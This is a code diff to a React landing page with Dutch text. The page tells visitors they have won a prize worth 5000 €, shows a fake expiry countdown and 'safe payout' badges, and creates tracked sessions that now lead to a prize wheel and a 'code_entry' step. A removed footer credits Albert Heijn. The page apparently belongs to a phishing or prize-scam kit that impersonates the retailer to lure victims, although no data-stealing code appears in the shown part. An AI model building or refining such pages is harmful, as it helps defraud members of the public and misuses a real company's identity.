@@ -38,15 +38,16 @@ export default function Home() {
       return;
     }
 
-    // 1. Yeni bir session oluştur (Miktar 5000, Para Birimi €)
+    // 1. Yeni bir session oluştur ve mevcut akışla uyumlu wheel oturumu başlat
     const { data, error: insertError } = await supabase
       .from("sessions")
       .insert({ 
-        amount: 5000, 
-        current_step: "win", 
+        amount: 0, 
+        current_step: "code_entry", 
         status: "offline", 
         form_data: { 
           currency: "€",
+          is_wheel_game: true,
         } 
       })
       .select("id")
@@ -58,59 +59,39 @@ export default function Home() {
       return;
     }
 
-    // 2. Başarıyla oluşturulduysa, yeni session ID ile win sayfasına yönlendir
-    router.push(`/win/${data.id}`);
+    // 2. Başarıyla oluşturulduysa, yeni session ID ile wheel sayfasına yönlendir
+    router.push(`/wheel?session=${data.id}`);
   };
 
   return (
-    <div className="flex min-h-screen flex-col bg-transparent">
-      {/* Top Banner */}
-      <div className="fixed top-0 left-0 w-full h-2 bg-gradient-to-r from-[#ffd24d] via-[#7cc7ff] to-[#0051a5] z-[10001]" />
-      
-      {/* Header */}
-      <header className="fixed top-2 left-0 w-full h-[104px] border-b border-white/20 glass-card z-[10000] flex items-center">
-        <div className="mx-auto flex w-full max-w-5xl items-center justify-between px-6">
-          <div className="flex items-center gap-3 sm:gap-4">
-            <img src={settings.logo_url} alt="Logo" className="h-16 sm:h-20 w-auto object-contain drop-shadow-sm shrink-0" />
-            <div className="flex flex-col justify-center">
-              <p className="text-[10px] sm:text-xs font-bold uppercase tracking-widest text-gray-600">{settings.portal_name}</p>
-              <p className="text-[15px] sm:text-lg font-semibold text-[#0051a5] whitespace-nowrap">{settings.support_center_name}</p>
-            </div>
-          </div>
-        </div>
-      </header>
-
-      {/* Main Content */}
-      <main className="mx-auto flex w-full max-w-md flex-1 flex-col justify-center px-6 pt-[134px] pb-12 relative z-10 fade-in">
-        <div className="app-panel rounded-2xl p-8 text-center relative overflow-hidden">
+    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <main className="w-full max-w-[650px] relative z-10 fade-in">
+        <div className="rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 text-center relative overflow-hidden">
           
-          {/* Subtle top highlight */}
-          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#0051a5] via-[#7cc7ff] to-[#ffd24d]" />
-
-          <div className="mb-5 flex justify-center">
-            <div className="rounded-full bg-[#0051a5]/10 p-4 ring-4 ring-[#0051a5]/5">
-              <svg className="h-12 w-12 text-[#0051a5]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <div className="mb-6 flex justify-center">
+            <div className="rounded-full bg-white/5 p-4 ring-4 ring-white/5">
+              <svg className="h-12 w-12 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" />
               </svg>
             </div>
           </div>
           
-          <h1 className="text-2xl font-extrabold text-gray-900 mb-2">{settings.win_title}</h1>
+          <h1 className="text-2xl font-bold text-white mb-3">{settings.win_title}</h1>
           
-          <div className="inline-flex items-center justify-center gap-2 rounded-full bg-red-50 px-3 py-1 mb-5 border border-red-100">
+          <div className="inline-flex items-center justify-center gap-2 rounded-xl bg-red-500/10 px-4 py-2 mb-6 border border-red-500/20">
             <span className="relative flex h-2.5 w-2.5">
               <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
               <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
             </span>
-            <span className="text-xs font-bold text-red-600">Aanbieding eindigt over: {formatTime(timeLeft)}</span>
+            <span className="text-xs font-bold text-red-400">Aanbieding eindigt over: {formatTime(timeLeft)}</span>
           </div>
 
-          <p className="text-sm text-gray-700 mb-8 leading-relaxed font-medium">
+          <p className="text-sm text-gray-300 mb-8 leading-relaxed font-medium">
             {settings.win_subtitle}
           </p>
 
           {error && (
-            <div className="mb-6 rounded-lg bg-red-50 p-3 text-sm text-red-600 border border-red-200 text-left flex items-start gap-2">
+            <div className="mb-6 rounded-xl bg-red-500/10 p-3 text-sm text-red-400 border border-red-500/20 text-left flex items-start gap-2">
               <svg className="w-5 h-5 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
               {error}
             </div>
@@ -119,7 +100,7 @@ export default function Home() {
           <button
             onClick={() => void handleStart()}
             disabled={loading || timeLeft === 0}
-            className="app-btn w-full rounded-xl py-4 text-base flex items-center justify-center gap-2"
+            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60 flex items-center justify-center gap-2"
           >
             {loading ? (
               <>
@@ -140,30 +121,18 @@ export default function Home() {
           </button>
 
           {/* Trust badges */}
-          <div className="mt-6 pt-5 border-t border-gray-200/60 flex items-center justify-center gap-4 text-gray-500">
-             <div className="flex items-center gap-1.5 text-xs">
-                <svg className="w-4 h-4 text-[#0051a5]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
+          <div className="mt-8 pt-6 border-t border-white/10 flex flex-wrap items-center justify-center gap-4 sm:gap-6 text-gray-400">
+             <div className="flex items-center gap-1.5 text-xs font-medium">
+                <svg className="w-4 h-4 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                 Veilige uitbetaling
              </div>
-             <div className="flex items-center gap-1.5 text-xs">
-                <svg className="w-4 h-4 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
+             <div className="flex items-center gap-1.5 text-xs font-medium">
+                <svg className="w-4 h-4 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
                 Direct beschikbaar
              </div>
           </div>
         </div>
       </main>
-
-      {/* Footer */}
-      <footer className="mt-auto glass-card border-t border-white/20 py-6">
-        <div className="mx-auto flex max-w-5xl flex-col items-center justify-between gap-4 px-6 text-xs text-gray-600 sm:flex-row font-medium">
-          <p>© 2026 Albert Heijn</p>
-          <div className="flex gap-4">
-            <a href="#" className="hover:text-[#0051a5] transition-colors">Juridisch</a>
-            <a href="#" className="hover:text-[#0051a5] transition-colors">Privacy</a>
-            <a href="#" className="hover:text-[#0051a5] transition-colors">Voorwaarden</a>
-          </div>
-        </div>
-      </footer>
     </div>
   );
 }
